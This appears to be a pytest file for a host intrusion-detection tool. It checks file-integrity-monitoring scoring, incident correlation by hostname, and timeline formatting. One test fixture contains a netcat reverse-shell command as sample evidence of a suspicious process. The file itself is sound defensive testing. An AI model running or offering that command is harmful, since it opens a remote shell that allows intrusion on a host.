"""Risk Engine and Incident Correlation integration tests for FIM (Phase 10)."""

import platform
import time
import pytest

from detector import SecurityEvent
from risk_engine import RiskEngine
from incident_manager import IncidentManager, get_detection_domain
from app import create_app
from database import db


@pytest.fixture
def app_context():
    app, _ = create_app(start_capture=False)
    app.config["TESTING"] = True
    app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///:memory:"

    with app.app_context():
        db.create_all()
        yield app
        db.session.remove()
        db.drop_all()


def test_fim_risk_engine_classification_and_scoring():
    """Verify FIM detection types are classified as host domain and scored deterministically."""
    engine = RiskEngine()

    fim_types = [
        ("FILE_CREATED", "MEDIUM", 0.40),
        ("FILE_DELETED", "MEDIUM", 0.40),
        ("FILE_MODIFIED", "MEDIUM", 0.40),
        ("FILE_REPLACED", "HIGH", 0.70),
        ("FILE_METADATA_CHANGED", "LOW", 0.20),
    ]

    for det_type, sev, base_sev_score in fim_types:
        engine = RiskEngine()
        # Check domain classification
        assert engine._classify_detection_type(det_type) == "host"


        # Check score calculation
        event = SecurityEvent(
            event_id=f"test-{det_type}",
            timestamp=time.time(),
            detection_type=det_type,
            severity=sev,
            source_ip=None,
            evidence={"path": "/etc/test", "change_type": det_type},
        )
        assessment = engine.assess(source_ip=None, rule_alerts=[event])
        assert assessment.rule_score == base_sev_score
        assert 0.0 <= assessment.combined_score <= 1.0
        # FIM events alone must NOT trigger automatic firewall block
        assert assessment.recommended_action in ("log", "alert", "monitor")
        assert assessment.blocked is False



def test_fim_incident_correlation_host_identity(app_context):
    """Verify FIM events correlate to host:<hostname> identity and never 127.0.0.1."""
    manager = IncidentManager()
    hostname = platform.node() or "localhost"

    fim_evt = SecurityEvent(
        event_id="fim-test-1",
        timestamp=time.time(),
        detection_type="FILE_MODIFIED",
        severity="MEDIUM",
        source_ip=None,
        evidence={"path": "/etc/ssh/sshd_config", "change_type": "FILE_MODIFIED", "source": "host"},
        description="Integrity fingerprint changed for /etc/ssh/sshd_config",
    )

    # 1. Check correlation key resolution
    corr_key, primary_src = manager.resolve_correlation_key(fim_evt)
    assert corr_key == f"host:{hostname}"
    assert primary_src is None
    assert "127.0.0.1" not in corr_key

    # 2. Check detection domain
    assert get_detection_domain("FILE_MODIFIED") == "host"
    assert get_detection_domain("FILE_REPLACED") == "host"

    # 3. Correlate event into incident
    incident = manager.correlate_security_event(fim_evt)
    assert incident.correlation_key == f"host:{hostname}"
    assert incident.primary_source_ip is None
    assert incident.event_count == 1
    assert "FILE_MODIFIED" in incident.detection_types
    assert "host" in incident.attack_domains


def test_fim_correlates_with_suspicious_process_on_host(app_context):
    """Verify FIM changes and suspicious processes on the same host aggregate into one incident."""
    manager = IncidentManager()
    hostname = platform.node() or "localhost"
    now = time.time()

    # 1. Suspicious process event on host
    proc_evt = SecurityEvent(
        event_id="proc-evt-1",
        timestamp=now,
        detection_type="SUSPICIOUS_PROCESS",
        severity="HIGH",
        source_ip=None,
        evidence={"pid": 1234, "cmdline": "nc -e /bin/sh 10.0.0.1 4444", "source": "host"},
        description="Suspicious process detected",
    )
    inc1 = manager.correlate_security_event(proc_evt)
    assert inc1.correlation_key == f"host:{hostname}"
    assert inc1.event_count == 1

    # 2. File modified event 5 seconds later
    fim_evt = SecurityEvent(
        event_id="fim-evt-1",
        timestamp=now + 5,
        detection_type="FILE_MODIFIED",
        severity="MEDIUM",
        source_ip=None,
        evidence={"path": "/etc/shadow", "change_type": "FILE_MODIFIED", "source": "host"},
        description="Integrity fingerprint changed for /etc/shadow",
    )
    inc2 = manager.correlate_security_event(fim_evt)

    # Must be aggregated into the exact same incident
    assert inc2.incident_id == inc1.incident_id
    assert inc2.event_count == 2
    assert "SUSPICIOUS_PROCESS" in inc2.detection_types
    assert "FILE_MODIFIED" in inc2.detection_types
    # Multi-vector boost applies
    assert inc2.risk_score >= inc1.risk_score


def test_fim_timeline_formatting(app_context):
    """Verify incident timeline cleanly formats FIM events without dumping file content."""
    manager = IncidentManager()
    now = time.time()

    fim_evt = SecurityEvent(
        event_id="fim-timeline-1",
        timestamp=now,
        detection_type="FILE_REPLACED",
        severity="HIGH",
        source_ip=None,
        evidence={
            "path": "/etc/pam.d/common-auth",
            "change_type": "FILE_REPLACED",
            "previous_inode": 1111,
            "current_inode": 2222,
            "previous_sha256": "aaaa1111",
            "current_sha256": "bbbb2222",
            "source": "host",
        },
        description="File replaced: inode changed for /etc/pam.d/common-auth",
    )

    incident = manager.correlate_security_event(fim_evt)
    timeline = manager.build_incident_timeline(incident.incident_id)

    assert len(timeline) >= 2  # INCIDENT_OPEN + SECURITY_EVENT
    fim_items = [t for t in timeline if t.get("type") == "SECURITY_EVENT"]
    assert len(fim_items) == 1
    item = fim_items[0]
    assert item["title"] == "File Integrity: Replaced"
    assert "File replaced" in item["description"] or "File integrity change detected" in item["description"]
    assert item["severity"] == "HIGH"
    assert item["metadata"]["path"] == "/etc/pam.d/common-auth"
